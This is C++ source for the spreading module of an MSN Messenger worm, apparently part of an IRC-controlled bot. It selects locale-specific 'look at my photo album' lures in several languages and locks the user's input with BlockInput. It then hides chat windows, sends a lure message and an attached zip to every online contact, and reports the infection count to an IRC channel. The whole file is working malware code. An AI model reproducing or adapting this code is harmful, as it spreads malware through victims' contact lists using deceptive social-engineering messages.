#include "inc.h"


#import "MSNMessengerAPI.tlb" named_guids, no_namespace

void to_variant(BSTR, VARIANT& vt);
int trx;

static const char *gen_msgenglish[] = {
  "Selam kanka þu resmime baksana bi",
  "slm resmime bi bakarmýsýn",
  "nasýl çýkmýþým bi bakarmýsýn",
  "al foto'mu yollim sana"
};

static const char *gen_msgfrench[] = {
  "looool tu dois voire mon photo album",
  "ma soeur a voulu que tu regarde ca",
  "je vien de finire ce photo album :D",
  "j fais pour toi ce photo album tu dois le voire :)",
  "tu dois voire les tof de notre bande",
  "c seulement mes tof de derniers vacances",
  "eeeh c mes tof :p"
};

static const char *gen_msgdutch[] = {
	"HEY lol heb ik een nieuw fotoalbum!: gedaan) Tweede ziek vindt dossier en verzendt u het ",
	"wanna Hey ziet mijn nieuw fotoalbum?", 
	"Hey keurt mijn fotoalbum, nieuwe pics van Nice van goed me en mijn vrienden en materiaal en toen ik jonge lol...", 
	"Hey beëindigde enkel nieuw fotoalbum! :) een paar nudes zou kunnen zijn;) lol... ", 
	"hey kreeg u een fotoalbum? anyways heres mijn nieuw fotoalbum:) keur k goed?",
	"hey mens keurt mijn nieuw fotoalbum goed.. :(",
	"het voor yah, doend beeldverhaal van mijn leven lol.."
};

static const char *gen_msggerman[] = {
	"he möchten mein neues Fotoalbum sehen?",
	"Geck, nehmen bitte sein nur mich Fotoalbum an: (!",
	"he möchten mein neues Fotoalbum sehen?",
	"lol meine Schwester wünscht mich Ihnen dieses Fotoalbum schicken"
};

static const char *gen_msgspain[] = {
	"¡El tipo, me acepta por favor su solamente álbum de foto: (!",
	"¡Hey i que hace el álbum de foto! Si vea el loL del em",
	"vengo de fi este foto álbum",
	"el lol mi hermana quisiera que le enviara este álbum de foto"
};


char *stristr(const char *String, const char *Pattern) {
	char *pptr, *sptr, *start;
	unsigned int slen, plen;

	for (start = (char *) String,
			pptr = (char *) Pattern,
			slen = strlen (String), plen = strlen (Pattern);

			slen >= plen; start++, slen--) {

		while (toupper (*start) != toupper (*Pattern)) {
			start++;
			slen--;



			if (slen < plen)
				return (NULL);
		}

		sptr = start;
		pptr = (char *) Pattern;

		while (toupper (*sptr) == toupper (*pptr)) {
			sptr++;
			pptr++;



			if ('\0' == *pptr)
				return (start);
		}
	}
	return (NULL);
}


void key_type(char* text, HWND hwnd)
{
HGLOBAL hData;
LPVOID pData;
OpenClipboard(hwnd);
EmptyClipboard();
hData = GlobalAlloc(GMEM_DDESHARE | GMEM_MOVEABLE, strlen(text) + 1);
pData = GlobalLock(hData);
strcpy((LPSTR)pData, text);
GlobalUnlock(hData);
SetClipboardData(CF_TEXT, hData);
CloseClipboard();
}


void dropfiles(HWND hwnd){
    char windir[260];
	char szFiles[260];
	GetWindowsDirectory(windir,sizeof(windir));
	strcat(windir,szZipname);
	memset(szFiles, '\0', sizeof(windir));
	sprintf(szFiles, "%s",windir);

if (::OpenClipboard (hwnd)) {
    ::EmptyClipboard ();
    int nSize = sizeof (DROPFILES) + sizeof (szFiles);
    HANDLE hData = ::GlobalAlloc (GHND, nSize);
    LPDROPFILES pDropFiles = (LPDROPFILES) ::GlobalLock (hData);
    pDropFiles->pFiles = sizeof (DROPFILES);

#ifdef UNICODE
    pDropFiles->fWide = TRUE;
#else
    pDropFiles->fWide = FALSE;
#endif

    LPBYTE pData = (LPBYTE) pDropFiles + sizeof (DROPFILES);
    ::CopyMemory (pData, szFiles, sizeof (szFiles));
    ::GlobalUnlock (hData);
    ::SetClipboardData (CF_HDROP, hData);
    ::CloseClipboard ();
}



}

void msnspread()
{
	char tempp[2];
	const char *masgg;
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, tempp, sizeof(tempp));
	if (strstr(tempp, "FR"))
	{
		masgg = *gen_msgfrench;
	}
	else if (strstr(tempp, "ES") || strstr(tempp, "MX"))
	{
		masgg = *gen_msgspain;
	}
	else if (strstr(tempp, "NL") || strstr(tempp, "BE"))
	{
		masgg = *gen_msgdutch;
	}

	else if (strstr(tempp, "DE"))
	{
		masgg = *gen_msggerman;
	}
	else 
	{
		masgg = *gen_msgenglish;

	}


	IMSNMessenger *pIMessenger = NULL;
	
	CoInitialize(0);

	HRESULT hr = CoCreateInstance(
		CLSID_Messenger,
		NULL,
		CLSCTX_ALL,
		IID_IMSNMessenger,
		(void **)&pIMessenger);

	if (SUCCEEDED(hr))
	{
		char msg[256];
		IDispatch * dispContacts = NULL;
		pIMessenger->get_MyContacts(&dispContacts);
		if (SUCCEEDED(hr))
		{
			IMSNMessengerContacts *pIMessengerContacts = NULL;

			hr = dispContacts->QueryInterface(__uuidof(pIMessengerContacts),(LPVOID*)&pIMessengerContacts);
			if (SUCCEEDED(hr))
			{
				
				IDispatch * dispContact					= NULL;
				IMSNMessengerContact *pIMessengerContact	= NULL;
				long iContacts;

				hr = pIMessengerContacts->get_Count(&iContacts);
				if (SUCCEEDED(hr))
				{
					BlockInput(true);
					for (long i = 0; i < iContacts; i++)	
					{
						hr = pIMessengerContacts->raw_Item(i,&dispContact);
						if (SUCCEEDED(hr))
						{
							hr = dispContact->QueryInterface(__uuidof(pIMessengerContact),(LPVOID*)&pIMessengerContact);
							if (SUCCEEDED(hr))
							{
								BSTR szContactName;
								VARIANT vt_user;
								MISTATUS miStatus;
								IDispatch *pIDispatch = NULL;
								IMSNMessengerWindow *pIMessengerWindow;
								LONG wndIM;

								hr = pIMessengerContact->get_Status(&miStatus);
								if (SUCCEEDED(hr))
								{
									if (miStatus == MISTATUS_OFFLINE)
									{
										pIMessengerContact->Release();
										dispContact->Release();
										continue;
									}
								}
								pIMessengerContact->get_SigninName(&szContactName);
								VariantInit( &vt_user );
								to_variant(szContactName, vt_user);
								Sleep(3000);
								hr = pIMessenger->raw_InstantMessage(vt_user,&pIDispatch);
								if (SUCCEEDED(hr))
								{
									hr = pIDispatch->QueryInterface(IID_IMSNMessengerWindow, (void**)&pIMessengerWindow);
									if (SUCCEEDED(hr))
									{
										Sleep(10);
										pIMessengerWindow->get_HWND(&wndIM);
										SetForegroundWindow((HWND) wndIM);
										SetFocus((HWND) wndIM);
										trx++;
										ShowWindow((HWND) wndIM,0);										
										srand(GetTickCount());										
                                        int i = rand() % sizeof(gen_msgenglish) / sizeof(gen_msgenglish[0]);
                                        key_type((char *)gen_msgenglish[i], (HWND) wndIM);
										keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);
                                        keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0); 
                                        keybd_event(VK_RETURN, 0, 0, 0);
										Sleep(50);								
										dropfiles((HWND) wndIM);
                                        keybd_event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
                                        keybd_event(VkKeyScan('V'), 0, 0, 0);                                        
										keybd_event(VK_CONTROL, 45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);																			
									}

								}
								pIMessengerContact->Release();
								dispContact->Release();
							}
						}
					}
					BlockInput(false);
					if (trx > 1)
					{
					sprintf(msg,  "PRIVMSG #deneme :MSN worm yollandý: %d adrese..\n", trx);
	                send(sock, msg, strlen(msg), 0);
					}
					pIMessengerContacts->Release();
				}
				dispContacts->Release();
			}
		}
		pIMessenger->Release();
	}

	CoUninitialize();


}

void to_variant(BSTR str, VARIANT& vt)
{
	reinterpret_cast<_variant_t&>(vt) = str;
} 